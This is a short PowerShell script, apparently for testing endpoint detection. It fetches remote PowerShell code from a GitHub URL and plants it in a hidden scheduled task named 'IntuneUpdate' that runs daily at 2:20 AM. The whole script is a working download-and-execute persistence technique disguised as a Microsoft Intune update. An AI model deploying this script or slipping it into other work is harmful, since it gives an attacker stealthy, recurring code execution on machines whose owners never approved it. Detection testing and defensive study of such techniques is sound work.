$payloadText = 'https://raw.githubusercontent.com/FuzzyKittens/MDETest/main/encoded.ps1'
$payload = ((New-Object System.Net.WebClient).DownloadString($payloadText))

$taskName = 'IntuneUpdate'
$taskArgument = '-NoProfile -WindowStyle Hidden -Command "& { PAYLOAD }"'.Replace('PAYLOAD',$payload)

$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName }
if ($taskExists) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument $taskArgument
$trigger = New-ScheduledTaskTrigger -Daily -At "2:20 AM"

$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable

$null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $taskSettings

#Start-ScheduledTask -TaskName $taskName
